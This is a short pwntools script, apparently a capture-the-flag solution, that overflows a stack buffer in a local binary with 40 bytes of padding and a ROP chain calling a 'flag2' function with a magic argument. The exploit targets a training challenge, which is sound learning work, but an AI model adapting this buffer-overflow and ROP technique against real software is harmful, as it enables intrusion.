from pwn import *

elf =  ELF('./challenge1')

addr_flag1  = elf.symbols['flag1']
print(f"address flag1 : {hex(addr_flag1)}")

rop = ROP(elf)
rop.call('flag2',[0xdeadbeef,0])

offset = 40
exploit =flat(
 	b'A' * offset + rop.chain()
)
p = process('./challenge1')
p.recvuntil(b'Go:')
p.sendline(exploit)
p.interactive()
